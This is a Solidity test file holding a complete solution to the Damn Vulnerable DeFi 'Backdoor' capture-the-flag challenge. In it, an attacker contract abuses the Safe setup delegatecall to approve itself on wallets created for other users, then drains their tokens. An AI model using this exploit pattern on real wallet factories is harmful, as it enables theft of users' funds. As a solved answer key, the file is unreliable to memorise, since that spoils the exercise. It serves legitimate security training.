// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Helper: deployed first, then used as delegatecall target
contract ApproveHelper {
    function approve(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

contract BackdoorAttacker {
    constructor(
        SafeProxyFactory factory,
        address singleton,
        WalletRegistry registry,
        address token,
        address[] memory users,
        address recovery
    ) {
        // Deploy helper first (code exists for delegatecall)
        ApproveHelper helper = new ApproveHelper();

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory setupData = abi.encodeCall(helper.approve, (token, address(this)));

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,           // _owners: [user]
                    1,                // _threshold
                    address(helper),  // to: delegatecall target
                    setupData,        // data: approve calldata
                    address(0),       // fallbackHandler
                    address(0),       // paymentToken
                    0,                // payment
                    payable(address(0)) // paymentReceiver
                )
            );

            factory.createProxyWithCallback(
                singleton,
                initializer,
                i,
                registry
            );

            // Wallet now has 10 DVT + we have approval → drain
            address wallet = registry.wallets(users[i]);
            IERC20(token).transferFrom(wallet, recovery, 10e18);
        }
    }
}

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();
        token = new DamnValuableToken();
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
        vm.stopPrank();
    }

    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
            vm.expectRevert(bytes4(hex"82b42900"));
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    function test_backdoor() public checkSolvedByPlayer {
        new BackdoorAttacker(
            walletFactory,
            address(singletonCopy),
            walletRegistry,
            address(token),
            users,
            recovery
        );
    }

    function _isSolved() private view {
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);
            assertTrue(wallet != address(0), "User didn't register a wallet");
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
